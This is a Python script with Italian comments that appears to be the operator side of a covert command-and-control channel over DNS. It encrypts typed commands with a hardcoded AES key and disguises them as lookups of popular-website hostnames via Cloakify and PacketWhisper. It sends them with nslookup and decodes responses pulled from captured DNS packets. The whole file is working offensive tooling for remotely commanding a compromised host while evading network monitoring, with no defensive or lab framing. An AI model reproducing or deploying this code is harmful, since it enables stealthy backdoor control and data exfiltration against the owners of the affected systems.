import subprocess
import os
from decloakify import Decloakify
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from scapy.all import sniff, wrpcap
from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile

# Chiave AES (16, 24 o 32 byte)
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"

def send_command(command):
    # Criptare il comando
    encrypted_command = encrypt_message(command, key) #debug
    print("Encrypted command: "+encrypted_command)
    # Genera e cloackifica il comando in `cloaked_command.txt`
    cloaked_command = "cloaked_command.txt"
    
    print("Cloaking command...")
    Cloakify(encrypted_command, cipher, cloaked_command)

    print("Initializing command transfer")
    TransferCloakedFile("cloaked_command.txt", 0.0)
    # Verifica che il file `cloaked_command.txt` sia stato creato correttamente
    if not os.path.exists(cloaked_command):
        print("Errore: il file `cloaked_command.txt` non è stato creato.")
        return

    # Invia il comando tramite pacchetti DNS
    with open(cloaked_command, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            subprocess.call(['nslookup', fqdn_str])

    # Rimuove il file dopo l'invio per evitare invii ripetuti
    os.remove(cloaked_command)


def receive_response():
    print("Capturing pcap...")
    subprocess.call(['python', 'pcapCapture.py']) 
    print("pcap collected...")
    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )

    cloaked_response = cloakedFile #"cloaked.payload"
    decloaked_response = "decloaked_response.txt"
    
    with open(cloaked_response, 'r') as file:
        if file.read().strip() == "":
            print("No response received.")
            return
        
    # Decloakificare il comando
    print("Decloakifying...")
    Decloakify(cloaked_response, cipher, decloaked_response)

    # Decrypt command
    with open(decloaked_response, 'r') as file:
        encrypted_response = file.read().strip()
    #print("encrypted_response: ", encrypted_response)
    response = decrypt_message(encrypted_response, key)
    print('Received response: ',response)
    
        

    # Rimuove il file di comando dopo l'elaborazione
    os.remove(cloaked_response)
    os.remove(decloaked_response)


if __name__ == "__main__":
    while True:
        command = input("Inserisci il comando da eseguire sul server: ")
        send_command(command)
        receive_response()
    
